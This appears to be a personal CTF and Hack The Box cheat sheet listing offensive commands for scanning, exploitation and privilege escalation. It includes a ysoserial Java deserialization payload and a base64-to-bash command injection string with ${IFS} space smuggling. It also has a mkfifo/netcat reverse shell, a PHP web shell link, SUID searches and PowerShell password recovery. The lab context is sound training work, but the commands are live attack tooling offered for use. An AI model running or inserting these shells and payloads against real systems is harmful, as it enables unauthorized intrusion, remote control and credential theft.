# Notes that include various things I've found useful in some ctfs. 
## Tools

Subdomain enumeration 


* GoBuster - good for DNS searchers. Always use the -t 1000 switch while on VPN
* DirSearch - Quick for directory searches 
* FFuF - doesn't work that well on HTB vpns


nmap
* Service Version all with output to note. 
```
sudo nmap -sV -A host -oN host-nmap.txt
```
* Regular scan for a quick scan
```
nmap -p- host
```
* udp scan -T4 + agression -vv verbose
```
nmap -sU -T4 -vv
```
Serliaze a command (this case a ping) to a .des file to eventually turn into b64 
```
java -jar ysoserial-all.jar CommonsBeanutils1 'ping 10.10.14.11 -c 5' > ping.des 
```

Get the b64 payload 
```
base64 -w 0 ping.des > ping.b64 
```

Reading base64 payload then running in bash. 
```
;echo 'payload'|base64 -d|bash;
```

Find Permissions that you have - 
```
find / -type f -perm -u=s 2>/dev/null
```

Find Password in Derby.dat (ofbiz)
```
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
```

Sign in as admin
```
su root
```	
Make bash script executable 
```
chmod +x filename.sh
```
See if you can run anything that normally requires sudo with current account
```
sudo -l
```

White [space] in commands
```
${IFS}
```
		
Basic Netcat listener 
```
nc -lvnp 4444
```
	
Basic http.server to fetch with
```
python3 -m http.server
```	
PhP shell, save as .phar file or other php varients. 
```
https://github.com/flozz/p0wny-shell
```
SNMPWalk - Gather info from SNMP. v2c specifies snmp version -c specifies a specific string you're looking for
```
snmpwalk -v2c -c string domain 
snmpwalk -c <community_string> -v2c <OID>
```
	
Basic SQLmap on a domain 
```
sqlmap -u "vulndomain" --batch 
```
Fetching password in windows using powershell 
```
echo PASSWORD > pass.txt
$EncryptedString = Get-Content .\pass.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

#Shells
Outside of revshells, there may be others that are useful 
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [IP] [port] >/tmp/f
```


# Identification 
```
uname -a
```
```
cat /etc/os-release
```
```
find / -name "filename.type"
```

***Look at some word lists that include/actuator***

# Tips N Tricks

***Always try default credentials***

When using the cookie, use the intercept mode and do it one by one for each authentication in Burp. There is a way to configure it where it will automatically use it, somewhere. Haven't figured that part out. 

When doing downloads, use intercept and see if you can do directory traversal or fetch other files than what you're looking to downloads

Look at the individual folders for the writeups I'll do.. They're literally a transcription of my notes that I take while working on these boxes. 

# Good Resources 

GTFOBins
	https://gtfobins.github.io/

Hack Tricks
	https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp?source=post_page-----cc2d7b64da35--------------------------------
